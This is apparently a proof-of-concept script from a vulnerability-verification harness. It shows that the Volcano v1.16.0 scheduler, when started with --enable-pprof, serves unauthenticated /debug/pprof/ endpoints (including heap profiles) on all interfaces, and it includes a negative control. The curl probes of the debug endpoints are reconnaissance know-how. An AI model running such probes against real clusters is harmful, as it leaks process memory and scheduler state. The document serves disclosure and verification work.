# -*- coding: utf-8 -*-
"""Dynamic proof for the Volcano v1.16.0 scheduler pprof surface.

Binary provenance: official image ``volcanosh/vc-scheduler:v1.16.0``
(``sha256:157578510d406c7390419dec97e81c5797969231022be39eb92e81feee0bbd71``),
extracted ``/vc-scheduler`` -> ``/root/bin/volcano-scheduler``.  ``--version``
reports ``41f27d567fb5bdaf2cab01e1caaf48f7e266eefb``, matching the pinned tag.

The PoC applies the pinned Volcano CRDs, starts the scheduler twice: once
without ``--enable-pprof`` (negative control: the debug port is closed) and
once with it (``/debug/pprof/`` returns 200 on all interfaces).  The scheduler
serves the debug mux even while leader election is still retrying, which is the
exposure being demonstrated.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import golab  # noqa: E402
import poclib  # noqa: E402

CASE_ID = "volcano-scheduler-server-go-pprof-exposed-l162-regex"
PORT = 18083


def kill_scheduler() -> None:
    golab.run("ps | awk '/[v]olcano-scheduler/ {print $1}' | xargs -r kill -9 2>/dev/null || true",
              check=False)


def start(extra: str) -> None:
    kill_scheduler()
    golab.ssh("sleep 1", check=False)
    golab.run(
        "KUBECONFIG=/etc/rancher/k3s/k3s.yaml nohup /root/bin/volcano-scheduler "
        f"--listen-address=0.0.0.0:{PORT} --kubeconfig=/etc/rancher/k3s/k3s.yaml {extra} "
        ">/root/volcano.log 2>&1 &",
        check=False,
    )


def http_code(url: str) -> str:
    return golab.run(f"curl -s -o /dev/null -w '%{{http_code}}' {url}", check=False).strip()


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    evidence = poclib.EVIDENCE_DIR
    (evidence / "http").mkdir(parents=True, exist_ok=True)

    def save(name: str, text: str) -> None:
        (evidence / "http" / name).write_text(text, encoding="utf-8")

    payload = {"case": CASE_ID, "method": "dynamic-http", "component": "volcano",
               "version": manifest.get("version"),
               "binary_provenance": "volcanosh/vc-scheduler@sha256:157578510d406c7390419dec97e81c5797969231022be39eb92e81feee0bbd71"}
    try:
        golab.run("for f in /root/src/volcano/config/crd/volcano/bases/*.yaml; do "
                  "kubectl apply -f \"$f\" >/dev/null 2>&1 || true; done")
        golab.run("kubectl create namespace volcano-system --dry-run=client -o yaml | "
                  "kubectl apply -f - >/dev/null")
        kill_scheduler()

        # Negative control: the debug mux is not mounted without --enable-pprof.
        start("")
        golab.ssh("sleep 8", check=False)
        off = http_code(f"http://127.0.0.1:{PORT}/debug/pprof/")
        save("pprof-disabled.txt", f"status={off}\n")
        poclib.require(off != "200", "pprof answered without --enable-pprof", status=off)

        start("--enable-pprof")
        default = "000"
        for _ in range(30):
            default = http_code(f"http://127.0.0.1:{PORT}/debug/pprof/")
            if default == "200":
                break
            golab.ssh("sleep 1", check=False)
        save("pprof-enabled.txt", f"status={default}\n")
        poclib.require(default == "200", "pprof did not answer with --enable-pprof", status=default)

        index = golab.run(f"curl -s http://127.0.0.1:{PORT}/debug/pprof/")
        save("pprof-index.html", index)
        poclib.require("Types of profiles available" in index or "profile" in index.lower(),
                       "pprof index body looks wrong")

        heap = http_code(f"http://127.0.0.1:{PORT}/debug/pprof/heap?debug=1")
        save("pprof-heap.txt", f"status={heap}\n")
        poclib.require(heap == "200", "heap profile did not answer", status=heap)

        listeners = golab.run(f"netstat -lntp 2>/dev/null | grep ':{PORT}' || true")
        save("listeners.txt", listeners)
        poclib.require(f":{PORT}" in listeners, "scheduler debug listener missing", listeners=listeners)
        poclib.require(not any(f"127.0.0.1:{PORT}" in ln for ln in listeners.splitlines()),
                       "debug listener is loopback-only", listeners=listeners)

        eth0 = golab.run("ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1").strip()
        nonloop = http_code(f"http://{eth0}:{PORT}/debug/pprof/")
        save("nonloopback.txt", f"eth0={eth0} status={nonloop}\n")
        poclib.require(nonloop == "200", "non-loopback pprof request failed", status=nonloop)

        log = golab.run("tail -n 30 /root/volcano.log", check=False)
        save("volcano.log", log)
        version = golab.run("/root/bin/volcano-scheduler --version 2>&1 | tail -2", check=False)
        save("version.txt", version)
        binary_sha = golab.run("sha256sum /root/bin/volcano-scheduler | awk '{print $1}'").strip()

        payload.update({
            "http": [
                {"url": f"http://127.0.0.1:{PORT}/debug/pprof/", "pprof_flag": False, "status": off},
                {"url": f"http://127.0.0.1:{PORT}/debug/pprof/", "pprof_flag": True,
                 "status": int(default)},
                {"url": f"http://127.0.0.1:{PORT}/debug/pprof/heap?debug=1", "status": int(heap)},
                {"url": f"http://{eth0}:{PORT}/debug/pprof/", "status": int(nonloop), "non_loopback": True},
            ],
            "listeners": listeners.splitlines(),
            "version_output": version,
            "binary_sha256": binary_sha,
            "impact": "With --enable-pprof the scheduler mounts cmdline/profile/symbol/trace/heap on "
                      "its debug HTTP server without authentication; profiles expose scheduler state, "
                      "queue names and process memory.",
        })
    finally:
        kill_scheduler()
        golab.run("kubectl delete namespace volcano-system --ignore-not-found --wait=false >/dev/null",
                  check=False)

    poclib.prove_marker()
    poclib.finish_verified(payload)


if __name__ == "__main__":
    main()
